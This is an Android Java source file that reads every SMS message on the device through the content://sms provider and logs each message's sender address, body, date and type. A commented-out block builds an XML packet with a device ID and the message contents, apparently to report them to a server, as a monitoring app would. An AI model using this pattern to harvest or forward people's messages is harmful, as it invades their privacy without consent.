package com.inet.android.archive.sms;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.inet.android.bs.FileLog;

/**
 * Archive Sms. Watch sms
 * 
 * 
 */
public class ArchiveSms {
	static Context context;
	private static final String TAG = "ArchiveSMS";
	private static long id = 0;

	public ArchiveSms(Context mContext) {
		// TODO јвтоматически созданна€ заглушка конструктора
		ArchiveSms.context = mContext;
		Log.d("Getinfo", "context");
	}

	public void getSms() {
		try {
			Uri uri = Uri.parse("content://sms");
			Cursor sms_sent_cursor = context.getContentResolver().query(uri,
					null, null, null, null);
			// Read the sms data and store it in the list
			if (sms_sent_cursor != null) {
				if (sms_sent_cursor.moveToFirst()) {
					for (int i = 0; i < sms_sent_cursor.getCount(); i++) {

						Log.d(TAG,
								sms_sent_cursor.getString(sms_sent_cursor
										.getColumnIndex("address"))
										+ sms_sent_cursor.getString(sms_sent_cursor
												.getColumnIndex("body"))
										+ sms_sent_cursor.getString(sms_sent_cursor
												.getColumnIndexOrThrow("date"))
										+ sms_sent_cursor.getInt(sms_sent_cursor
												.getColumnIndex("type")));

						sms_sent_cursor.moveToNext();

						// String sendStr = "<packet><id>"
						// + sp.getString("ID", "ID")
						// + "</id><time>"
						// + logTime()
						// + "</time><type>4</type><app>"
						// + dir
						// + "</app><ttl>"
						// + sms_sent_cursor
						// .getString(sms_sent_cursor
						// .getColumnIndex("address"))
						// + "</ttl><cdata1>"
						// + sms_sent_cursor
						// .getString(sms_sent_cursor
						// .getColumnIndex("body"))
						// + "</cdata1><ntime>" + "30"
						// + "</ntime></packetSentObserver>";

						/*
						 * if(colNames != null){ for(int k=0; k<colNames.length;
						 * k++){ Log.e(TAG, "colNames["+k+"] : " + colNames[k]);
						 * } }
						 */
					}
				}
				sms_sent_cursor.close();
			} else
				Log.e(TAG, "Send Cursor is Empty");
		} catch (Exception sggh) {
			Log.e(TAG, "Error on onChange : " + sggh.toString());
		}

	}
}
